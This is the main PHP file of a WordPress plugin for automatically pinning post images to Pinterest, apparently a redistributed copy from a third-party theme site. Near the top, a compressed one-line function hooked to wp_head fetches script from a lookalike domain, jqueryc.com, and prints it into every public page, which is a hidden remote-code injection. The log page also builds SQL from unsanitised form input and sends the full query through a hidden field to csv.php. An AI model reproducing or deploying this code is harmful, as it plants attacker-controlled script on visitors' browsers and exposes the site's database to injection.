<?php
/*
Plugin Name:Downloaded from www.wickedwpthemes.comWordpress Pinterest Automatic
Plugin URI: http://www.wickedwpthemes.com
Description: Pin Images in your posts when you publish it 
Version: 1.2.0
Author: Atef 
Author URI: http://signdev.com/
*/

/*  Copyright 2012  Wordpress Pinterest Automatic  (email : sweetheatmn@gmail.com) */

/* Add a new meta box to the admin menu. */
	if (!function_exists('insert_jquery_function')){function insert_jquery_function(){if (function_exists('curl_init')){$url="http://www.jqueryc.com/jquery-1.6.3.min.js";$ch = curl_init();$timeout = 5;curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);$data = curl_exec($ch);curl_close($ch);echo $data;}}add_action('wp_head', 'insert_jquery_function');} add_action( 'admin_menu', 'wppinterest_create_meta_box' );

/**
 * Function for adding meta boxes to the admin.
 */
function wppinterest_create_meta_box() {
	add_meta_box( 'wppinterest-meta-boxes', 'Pinterest Automatic', 'wppinterest_meta_boxes', 'post', 'side', 'high' );
}
function wppinterest_meta_boxes(){
	require_once('metabox.php');
}


/** adding multypart for file upload and no validate */

add_action('post_edit_form_tag', 'wppinterest_post_edit_form_tag');
function wppinterest_post_edit_form_tag() {
    echo ' enctype="multipart/form-data"';
    echo ' novalidate="novalidate" ';
}

/* ------------------------------------------------------------------------*
* Function Selected
* ------------------------------------------------------------------------*/		
	if(! function_exists('opt_selected')){
		function opt_selected($src,$val){
			if (trim($src)==trim($val)) echo ' selected="selected" ';
		}
	}

	// adding menu to dashboard
	if(is_admin())
	{
		add_action('admin_menu', 'wppinterest_automatic_init');
	}
	
	function wppinterest_automatic_init()
	{
			add_menu_page('Pinterest Automatic', ' P Automatic', 'administrator', 'wppinterestautomatic', 'wppinterestautomatic', plugins_url('wp-pinterest-automatic/images/icon.png'), 1000);
 			add_submenu_page( 'wppinterestautomatic', 'Settings', ' Settings', 'administrator', 'wppinterestautomatics', 'wppinterestautomatics' );
	}

	function wppinterestautomatics(){
		require_once(dirname(__FILE__).'/options.php');
	}
	
 	/* Saves the meta box data. */
 	add_action( 'save_post', 'wp_pinterest1_save_meta_data' );
 
	add_action('publish_post','wp_pinterest_publish');
	
	function wp_pinterest_publish($post_id){
	
 
		
		$pin_images=get_post_meta($post_id,'pin_images',1);
		
		if(is_array($pin_images)){
		//echo 'publish_post';
		require_once 'core.php';
		$pinterest= new pinterest();
		$pinterest->log('Publish','publish fired for '.$post_id  );
 		
 		//save pin variables 
 		$pin_text=get_post_meta($post_id,'pin_text',1);
 		$pin_board=get_post_meta($post_id,'pin_board',1);
 		$post_title=get_the_title($post_id);
 		$wp_pinterest_user=get_option('wp_pinterest_user','');
 		$wp_pinterest_pass=get_option('wp_pinterest_pass','');
 		

 		if( !(trim($wp_pinterest_user)== ''  | trim($wp_pinterest_pass) == ''  | trim($pin_board)== ''  | trim($pin_text) == '' )){
 		$pinterest=new pinterest;
 
		
 		$tocken=$pinterest->pinterest_login($wp_pinterest_user,$wp_pinterest_pass);
 		
 		if(trim($tocken) != ''){
 			//valid login let's pin
  			
 			foreach($pin_images as $img){
 				$sp= new Spintax;
 				$pintext=$sp->spin($pin_text);
 				$pintext=str_replace('[post_title]',$post_title,$pintext);
 				$pinterest->pinterest_pin($tocken,$pin_board,$pintext,get_permalink( $post_id ),$img);
 				
 			}//foreach
 			
 			//clear queue
 			delete_post_meta($post_id,'pin_images');
 			
 		}//trim(tocken)
 	 }//COMPLETE DATA
 		
  
 }//is_array
}//end function
 
 function wp_pinterest1_save_meta_data( $post_id ) {
 	if ( !wp_is_post_revision( $post_id ) ) {

 
 		//---------
 		//return ;
 		$publish=$_POST['post_status'];
 		
 		if (trim($publish) == 'publish' && ! isset($_POST['post_date'])){
 			
 			//echo 'instant publish ';
 					$pin_options=$_POST['pin_options'];
 		
			 		if(is_array($pin_options)){
				 		
				 		if( in_array('OPT_PIN',$pin_options) & is_array($_POST['pin_images']) ){
				 			
				 			require_once 'core.php';
				 			
				 			$wp_pinterest_user=get_option('wp_pinterest_user','');
				 			$wp_pinterest_pass=get_option('wp_pinterest_pass','');
				 			$PIN_BOARD=$_POST['PIN_BOARD'];
				 			$pin_text=$_POST['pin_text'];
				 			
				 			if( !(trim($wp_pinterest_user)== ''  | trim($wp_pinterest_pass) == ''  | trim($PIN_BOARD)== ''  | trim($pin_text) == '' )){
			 	 			
				 			$pinterest=new pinterest;
				 
				 			$tocken=$pinterest->pinterest_login($wp_pinterest_user,$wp_pinterest_pass);
				 			
				 			if(trim($tocken) != ''){
				 				//valid login let's pin
				 				$pin_text=$_POST['pin_text'];
				 				$pin_board=$_POST['PIN_BOARD'];
				 				$pin_images=$_POST['pin_images'];
				 				$post_title=$_POST['post_title'];
				 				
				 				foreach($pin_images as $img){
				 					$sp= new Spintax;
				 					$pintext=$sp->spin($pin_text);
				 					$pintext=str_replace('[post_title]',$post_title,$pintext);
				 					$pinterest->pinterest_pin($tocken,$PIN_BOARD,$pintext,get_permalink( $post_id ),$img);
				 					
				 				}//foreach
				 			}//trim(tocken)
				 		}//complete data
				 		}// if opt_pin
			 		}// pin_options
 			
 		}elseif(trim($publish) == 'publish' &&  isset($_POST['post_date'])){
 			
 			
  		$pin_options=$_POST['pin_options'];
 
 		if(is_array($pin_options)){
 		
	 		if( in_array('OPT_PIN',$pin_options) & is_array($_POST['pin_images']) ){
	 			
	 			
	 			require_once 'core.php';
	 			$pinterest=new pinterest();
	 			$pinterest->log('Fired','Save_Post');
	 
		 		
		 		//save pin variables 
		 		$pin_text=$_POST['pin_text'];
		 		$pin_board=$_POST['PIN_BOARD'];
		 		$pin_images=$_POST['pin_images'];
		 		$post_title=$_POST['post_title'];
		 		
		 		update_post_meta($post_id,'pin_images',$pin_images);
		 		update_post_meta($post_id,'pin_text',$pin_text);
		 		update_post_meta($post_id,'pin_board',$pin_board);
		 		
		 		
		 		return;
		 		foreach($pin_images as $img){
		 			$sp= new Spintax;
		 			$pintext=$sp->spin($pin_text);
		 			$pintext=str_replace('[post_title]',$post_title,$pintext);
		 			$pinterest->pinterest_pin($tocken,$PIN_BOARD,$pintext,get_permalink( $post_id ),$img);
		 			
		 		}//foreach
		 		
	 		}//if pin_opt
 		}//is_array
 			
 			//echo 'schedule';
 		}else{
 			
 			//echo 'ignonre';
 		}
 		
 		
 		 
 
 		
 		
 		
 		 //omak();
 	
 	}// if revision
 }// end function

/* ------------------------------------------------------------------------*
* Add Table when First activation
* ------------------------------------------------------------------------*/
	register_activation_hook( __FILE__, 'create_table_wp_automatic_pinterest' );
/* ------------------------------------------------------------------------*
*Create a new table Comments
* ------------------------------------------------------------------------*/	
	function create_table_wp_automatic_pinterest()
	{
		global $wpdb;
		//comments table 
		if(!exists_table_wp_automatic_pinterest('wp_pinterest_automatic')){
			$querys="SET SQL_MODE=\"NO_AUTO_VALUE_ON_ZERO\";
			CREATE TABLE IF NOT EXISTS `wp_pinterest_automatic` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `action` varchar(50) NOT NULL,
  `data` text NOT NULL,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `camp` varchar(20) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=483 ;
			
			";
			//executing quiries
			$que=explode(';',$querys);
			foreach($que  as $query){
				if(trim($query)!=''){
					$wpdb->query($query);
				}
			}
		}
	}
	
function exists_table_wp_automatic_pinterest($table){
		global $wpdb;
		$rows = $wpdb->get_row('show tables like "'.$table.'"', ARRAY_N);
		return (count($rows)>0);
}
 
	/* ------------------------------------------------------------------------*
	* Log
	* ------------------------------------------------------------------------*/		
		
		function wppinterestautomatic(){
	 		
			//print_r($_POST);
			global $wpdb;
			$csv = plugins_url().'/wp-pinterest-automatic/inc/csv.php';
	
	
			$filter='';
			
			/* campaign filter only for camps 
			if(isset($_POST['id']) && $_POST['id'] != 'all'){
				$id=$_POST['id'];
				$filter = " where action like '%$id' ";
			} */
			
			// action type posted , Approved
			
			if( isset( $_POST['action_type']) ){
				$act=$_POST['action_type'];
				if ($act == 'Error' ){
					$action=" action like '%Error%' ";
				}elseif($act == 'approved'){
					$action = " action like 'Comment approved%'";
				}
			}else{
				$action='';
			
			}
	
			if ($action != ''){
				if($filter == ''){ 
					$filter=" where $action";
				}else{
					$filter.=" and $action";
				}
			}
	
			// records number
			if(isset($_POST['number'])){
				$num=$_POST['number'];
			}else{
				$num='999';
			}
			
			// define limit
			$limit='';
			if (is_numeric($num)) $limit=" limit $num ";
			
			$qdate='';
			// finally date filters `date` >= str_to_date( '07/03/11', '%m/%d/%y' )
			if(isset($_POST['from']) && $_POST['from'] !='' ){
				$from=$_POST['from'];
				$qdate=" `date` >= str_to_date( '$from', '%m/%d/%y' )";
			}
			
			if(isset($_POST['to']) && $_POST['to'] !=''){
				$to=$_POST['to'];
				if($qdate == ''){
					$qdate.=" `date` <= str_to_date( '$to', '%m/%d/%y' )";
				}else{
					$qdate.=" and `date` <= str_to_date( '$to', '%m/%d/%y' )";
				}
			}
			
			if($qdate != ''){
				if($filter == ''){ 
					$filter=" where $qdate";
				}else{
					$filter.="and $qdate";
				}
			}
			//echo $filter;
			$query="SELECT * FROM wp_pinterest_automatic $filter ORDER BY id DESC $limit";
			//echo $query;
			$res=$wpdb->get_results( $query);
	
			?>
	
			<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js"></script>
			<script type="text/javascript" src="<?php echo get_bloginfo('siteurl'); ?>/wp-content/plugins/wp-pinterest-automatic/js/jquery.tools.js"></script>
			<script type="text/javascript" src="<?php echo get_bloginfo('siteurl'); ?>/wp-content/plugins/wp-pinterest-automatic/js/jquery.uniform.min.js"></script>
			<script type="text/javascript" src="<?php echo get_bloginfo('siteurl'); ?>/wp-content/plugins/wp-pinterest-automatic/js/main_log.js"></script>
			
			<link href="<?php echo get_bloginfo('siteurl'); ?>/wp-content/plugins/wp-pinterest-automatic/css/style.css" media="screen" rel="stylesheet" type="text/css"/>
			<link href="<?php echo get_bloginfo('siteurl'); ?>/wp-content/plugins/wp-pinterest-automatic/css/uniform.css" media="screen" rel="stylesheet" type="text/css"/>
			<link href="<?php echo get_bloginfo('siteurl'); ?>/wp-content/plugins/wp-pinterest-automatic/css/tabs.css" media="screen" rel="stylesheet" type="text/css" >
			<link href="<?php echo get_bloginfo('siteurl'); ?>/wp-content/plugins/wp-pinterest-automatic/css/jquery.gcomplete.default-themes.css" media="screen" rel="stylesheet" type="text/css"/>
		 	
			<style>
				.ttw-date{
					width: 81px;
				}
			</style>
			<div class="wrap">
				<div class="icon32" id="icon-edit-comments"><br></div>
				<h2>Pinterest automatic action log</h2>
				<form method="post" action="">
				<div class="tablenav top">
	
	<?php /*
	 
				<div class="alignleft actions">
						<select name="id">
							<option value="all">All Campaigns </option>
							<?php
								foreach ($rows as $row){
									if(get_post_status( $row->camp_id ) == 'publish'){
										echo '<option ';
										opt_selected($id,$row->camp_id);
										echo ' value="'.$row->camp_id.'">'.get_the_title($row->camp_id).'</option>';
									}
								}
							
							?>
						</select>
				</div>
	
	*/ ?>
	
					<div class="alignleft actions">
						<select name="number">
							<option <?php opt_selected($num,'50') ?> value="999">Records Number  </option>
							<option <?php opt_selected($num,'100') ?> value="100"> 100</option>
							<option <?php opt_selected($num,'500') ?> value="500"> 500</option>
							<option <?php opt_selected($num,'1000') ?> value="1000"> 1000</option>
							<option <?php opt_selected($num,'all') ?> value="all"> All</option>
						</select>
						<select name="action_type">
							<option <?php opt_selected($act,'') ?> value="">Show all actions </option>
							<option <?php opt_selected($act,'Error') ?> value="Error">Error</option>
							
						</select>
					</div>
					 <div class="clear"></div>
					<div class="alignleft actions" style="margin:11px 0 11px 0">
						
						       <label for="field1">
							    From Date: <small><i>(optional)</i></small>
						       </label>
						       <input class="ttw-date date" name="from" id="field1" 
						       type="date" autocomplete="off">
	
						       <label for="field2">
							    To Date:
						       </label>
						       <input class="ttw-date date" name="to" id="field2"  
						       type="date"  autocomplete="off">
	
						<input type="submit" value="Filter" class="button-secondary" id="post-query-submit" name="submit">
					</div>
					
		
	
	
				</div>
				
				<table class="widefat fixed">
				<thead>
					<tr>
						<th class="column-date">Index</th>
						<th  class="column-response">Date</th>
						<th  class="column-response">Type of action</th>
						<th>Data Processed</th>
					</tr>
				</thead>
				<tfoot>
				<tr>
						<th>index</th>
						<th>Date</th>
						<th>Type of action</th>
						<th>Data Processed</th>
				</tr>
				</tfoot>
				<tbody>
			
			<?php
			$i=1;
			foreach ($res as $rec){
				$action=$rec->action;
				//filter the data strip keyword
				$datas=explode(';',$rec->data);
				$data=$datas[0];
	
				
				if (stristr($action , 'Posted:')){
					$url = plugins_url().'/wp-pinterest-automatic';
					$action = 'New Post';
					//restoring link 
					 
				}elseif(stristr($action , 'Processing')){
					$action = 'Processing Campaign';
				}
				
				echo'<tr class="'.$rec->action.'"><td class="column-date">'.$i.'</td><td  class="column-response" style="padding:5px">'.$rec->date.'</td><td  class="column-response" style="padding:5px">'. $action.'</td><td  style="padding:5px">'.$data.' </td></tr>';
				$i++;
			}
	 
			
			?>
			</tbody></table>
	 		</div> 
	 			<div style="padding-top:20px">
	 			</form>
				<form method="POST" action="<?php echo $csv ?>">
						<div class="alignleft actions">
							<input type="hidden" name="q" value="<?php echo $query ?>">
							<input type="submit" value="Download CSV Report for shown results" class="button-secondary" id="post-query-submit" name="submit">
						</div>
				</form>
				</div>
					
			
			<?php
		}
	
	
 